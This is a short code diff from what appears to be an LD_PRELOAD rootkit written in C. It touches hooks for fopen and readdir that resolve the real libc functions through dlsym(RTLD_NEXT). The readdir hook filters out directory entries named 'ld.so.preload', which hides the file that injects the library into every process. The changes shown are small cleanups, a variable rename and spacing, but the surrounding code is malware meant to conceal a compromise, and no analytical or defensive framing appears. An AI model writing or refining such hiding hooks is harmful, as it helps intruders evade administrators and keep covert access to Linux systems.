@@ -94,7 +94,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
 }
 
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
-FILE* fopen(const char *pathname, const char *mode){
+FILE *fopen(const char *pathname, const char *mode){
 
     orig_fopen = dlsym(RTLD_NEXT, "fopen");
     
@@ -127,10 +127,13 @@ struct dirent *readdir(DIR *dirp){
 
     struct dirent *directory;
 
-    while(directory = old_readdir(dirp)){
+    while(directory = orig_readdir(dirp)){
         if(strstr(directory -> d_name, "ld.so.preload") == 0) break;
     }
 
-    return  directory;
+    return directory;
 
 }
+
+
+
